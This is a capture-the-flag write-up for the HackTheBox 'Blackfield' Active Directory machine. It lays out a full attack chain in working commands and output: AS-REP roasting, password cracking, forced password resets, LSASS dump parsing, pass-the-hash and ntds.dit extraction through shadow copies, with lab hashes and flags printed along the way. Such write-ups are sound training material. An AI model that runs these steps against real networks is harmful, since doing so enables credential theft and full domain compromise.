# Blackfield — HackTheBox Writeup

**Difficulty:** Hard  
**OS:** Windows  
**Category:** Active Directory  
**Author:** nt0wl  

---

## Overview

Blackfield is a Hard-rated Windows Active Directory machine that chains together several real-world attack techniques: anonymous SMB enumeration, AS-REP Roasting, DACL abuse via BloodHound, LSASS memory dump analysis, and SeBackupPrivilege exploitation to extract the full domain credential database. No single step is particularly exotic — the challenge is recognizing how each foothold unlocks the next.

**Attack Path Summary:**

```
Anonymous SMB → Username Harvest → AS-REP Roast → BloodHound DACL Abuse
→ Forensic Share → LSASS Dump → svc_backup PtH → SeBackupPrivilege
→ VSS Shadow Copy → ntds.dit + SYSTEM → secretsdump → Domain Admin
```

---

## Reconnaissance

### Nmap

```bash
nmap -sCV -Pn -p- --min-rate 5000 10.129.229.17 -oA Blackfield
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                             (Domain: BLACKFIELD.local)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

**Key observations:**
- Domain: `BLACKFIELD.local`, DC hostname: `DC01`
- Kerberos (88) and WinRM (5985) both open — attack surface for AS-REP roasting and shell access
- Clock skew: **7 hours** — must be accounted for before any Kerberos operations

---

## Foothold

### Anonymous SMB Enumeration

RPC null session was denied. SMB anonymous share enumeration revealed a non-standard share:

```bash
nxc smb 10.129.229.17 -u '' -p '' --shares
```

```
profiles$    READ    (anonymous)
```

The `profiles$` share contained ~300 empty user profile directories. The directory names themselves served as a valid username list.

```bash
smbclient '//10.129.229.17/profiles$' -N -c 'ls' | awk '{print $1}' | grep -v '^\.' | grep -v '^$' > users.txt
```

Three accounts immediately stood out from the standard `FirstInitialLastname` pattern:
- `audit2020` — functional/service account naming
- `support` — often elevated permissions
- `svc_backup` — backup service account

### AS-REP Roasting

With a username list and no credentials, AS-REP Roasting is the logical next step — targeting accounts with Kerberos pre-authentication disabled.

**Clock skew fix (required for Kerberos):**
```bash
# System time was 7 hours behind the DC — use faketime wrapper
faketime -f '+7h' <command>
```

```bash
faketime -f '+7h' GetNPUsers.py BLACKFIELD.local/ \
  -dc-ip 10.129.229.17 \
  -usersfile users.txt \
  -format hashcat \
  -no-pass
```

**Result:** `support` account returned an AS-REP hash (pre-authentication disabled):

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:5f3a2643bd95109a...
```

### Hash Cracking

```bash
hashcat -m 18200 support.hash /path/to/rockyou.txt
```

**Cracked in 2 seconds:**
```
support : #00^BlackKnight
```

---

## Lateral Movement — support → audit2020

### BloodHound Enumeration

With valid credentials for `support`, BloodHound collection revealed a critical DACL edge:

```
SUPPORT@BLACKFIELD.LOCAL --[ForceChangePassword]--> AUDIT2020@BLACKFIELD.LOCAL
```

`support` had the `ForceChangePassword` right over `audit2020` — meaning the password could be reset without knowing the current one.

### Abusing ForceChangePassword

```bash
bloodyAD --host 10.129.229.17 -d BLACKFIELD.LOCAL \
  -u support -p '#00^BlackKnight' \
  set password audit2020 'Pwnd123!'
```

```
[+] Password changed successfully!
```

### Forensic Share Access

With `audit2020` credentials, a new share became accessible:

```bash
nxc smb 10.129.229.17 -u audit2020 -p 'Pwnd123!' --shares
```

```
forensic    READ    Forensic / Audit share.
```

```bash
smbclient '//10.129.229.17/forensic' -U 'BLACKFIELD.local/audit2020%Pwnd123!'
```

The share contained three directories:
- `commands_output/` — domain recon artifacts (domain_admins.txt, domain_users.txt, etc.)
- `memory_analysis/` — process memory dumps (`.zip` files)
- `tools/` — Sysinternals, Sleuth Kit

The critical file: **`memory_analysis/lsass.zip`**

---

## Credential Extraction — LSASS Dump

```bash
unzip memory_analysis/lsass.zip -d memory_analysis/
pypykatz lsa minidump memory_analysis/lsass.DMP
```

**Extracted hashes:**

| Account | NT Hash |
|---|---|
| `Administrator` | `7f1e4ff8c6a8e6b6fcae2d9c0572cd62` |
| `svc_backup` | `9658d1d1dcd9250115e2205d9f48400d` |
| `DC01$` | `b624dc83a27cc29da11d9bf25efea796` |

**Note:** The Administrator hash from LSASS was stale and failed WinRM authentication. `svc_backup` worked.

### Shell via Pass-the-Hash

```bash
nxc winrm 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
# [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

### User Flag

```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef51027e2852be64b543
```

---

## Privilege Escalation — SeBackupPrivilege → Domain Admin

### Identifying the Path

```powershell
whoami /all
```

```
BUILTIN\Backup Operators    Enabled
SeBackupPrivilege           Enabled
SeRestorePrivilege          Enabled
```

`svc_backup` is a member of **Backup Operators** — a privileged built-in group with `SeBackupPrivilege`. This allows reading **any file on the system** regardless of ACLs, including the locked AD database.

### Target Files

| File | Purpose |
|---|---|
| `C:\Windows\NTDS\ntds.dit` | AD database — all domain hashes |
| `HKLM\SYSTEM` | Boot key (SysKey) — needed to decrypt ntds.dit |

`ntds.dit` is locked by the OS at all times. The bypass: **Volume Shadow Copy Service (VSS)**.

### Creating a VSS Shadow Copy

Evil-WinRM's pseudo-terminal (WinRM over HTTP) can't support interactive applications. The workaround is feeding diskshadow a script via `cmd /c`:

```powershell
cmd /c 'echo set context persistent nowriters > C:\temp\shadow.dsh & echo add volume c: alias blackfield >> C:\temp\shadow.dsh & echo create >> C:\temp\shadow.dsh & echo expose %blackfield% z: >> C:\temp\shadow.dsh'

cmd /c 'diskshadow /s C:\temp\shadow.dsh'
```

```
Shadow copy ID = {5b2b4fd2-cccf-4820-8644-2c6745dcfcd1}
The shadow copy was successfully exposed as z:\
```

### Copying ntds.dit via Robocopy Backup Mode

```powershell
robocopy /b z:\Windows\NTDS\ C:\temp\ ntds.dit
```

The `/b` flag invokes backup mode, leveraging `SeBackupPrivilege` to bypass file ACLs.

### Saving the SYSTEM Hive

```powershell
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

### Downloading and Extracting

```powershell
download ntds.dit
download SYSTEM
```

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**All domain hashes:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:a91f7d2b3477f7b3254d143863aa8dd4:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

### Domain Admin Shell

```bash
evil-winrm -i 10.129.229.17 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

### Root Flag

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4375a629c7c67c8e29db269060c955cb
```

---

## Full Attack Chain

```
1. Anonymous SMB (profiles$)
   └─ ~300 username directories harvested

2. AS-REP Roasting (GetNPUsers.py)
   └─ support account → $krb5asrep$23$ hash
   └─ Hashcat -m 18200 → #00^BlackKnight

3. BloodHound Enumeration
   └─ support --[ForceChangePassword]--> audit2020

4. DACL Abuse (bloodyAD)
   └─ Reset audit2020 password → forensic share READ access

5. Forensic Share (audit2020)
   └─ lsass.zip → lsass.DMP

6. LSASS Analysis (pypykatz)
   └─ svc_backup NT hash → WinRM shell (Pass-the-Hash)
   └─ user.txt

7. SeBackupPrivilege Abuse
   └─ VSS shadow copy (diskshadow via cmd /c)
   └─ robocopy /b → ntds.dit
   └─ reg save → SYSTEM hive

8. secretsdump (impacket)
   └─ All domain hashes including Administrator

9. Pass-the-Hash → Administrator WinRM
   └─ root.txt
```

---

## Key Techniques Reference

| Technique | Tool | Purpose |
|---|---|---|
| AS-REP Roasting | `GetNPUsers.py` | Exploit accounts with pre-auth disabled |
| Pass-the-Hash | `evil-winrm` | Authenticate with NT hash, no password |
| DACL Abuse | `bloodyAD` | ForceChangePassword without knowing current password |
| LSASS Parsing | `pypykatz` | Extract hashes from memory dump offline |
| VSS Shadow Copy | `diskshadow` | Snapshot locked files (ntds.dit) |
| Backup Mode Copy | `robocopy /b` | Leverage SeBackupPrivilege to bypass ACLs |
| Domain Hash Dump | `secretsdump` | Decrypt ntds.dit with SYSTEM boot key |

---

## Lessons Learned

**Clock skew matters.** Kerberos enforces a 5-minute tolerance. A 7-hour difference breaks all ticket requests — always check `smb2-time` in nmap output and wrap Kerberos tools with `faketime`.

**BloodHound finds what manual enum misses.** ForceChangePassword is invisible without graph analysis. Always run a collector with any valid credential set.

**LSASS dumps are credential vaults.** A forensic share left accessible to an audit account is an OPSEC failure that hands attackers everything stored in memory at snapshot time.

**SeBackupPrivilege = read anything.** Backup Operators is a frequently overlooked group. Combined with VSS, it bypasses every file ACL on the system — including the AD database.

**Interactive tools fail over WinRM.** WinRM is XML over HTTP, not a real TTY. Tools that call `ReadConsole()` get nothing. Use script files fed via `cmd /c` as the workaround.

---

*nt0wl | 9t0wl.github.io*
